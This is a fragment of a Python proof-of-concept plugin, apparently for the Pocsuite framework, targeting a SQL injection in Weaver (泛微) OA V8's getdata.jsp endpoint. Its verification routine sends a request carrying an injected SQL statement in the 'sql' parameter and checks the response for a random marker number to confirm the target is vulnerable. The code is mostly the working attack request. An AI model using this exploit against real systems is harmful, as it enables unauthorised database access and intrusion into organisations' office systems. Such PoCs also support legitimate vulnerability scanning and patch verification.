...
class POC(POCBase):
    ...
    name = '泛微OA getdata.jsp SQL注入漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '泛微OA getdata.jsp SQL注入漏洞'  # 漏洞应用名称
    appVersion = '''泛微OA V8'''  # 漏洞影响版本
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        result = {}
        num=str(random.randint(1111111111,99999999999999999))
        vuln_url_1 = self.url + f"/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select {num} as id from HrmResourceManager"
        headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10)
            if response_1.status_code == 200 and num in response_1.text:
                result['VerifyInfo'] = {}
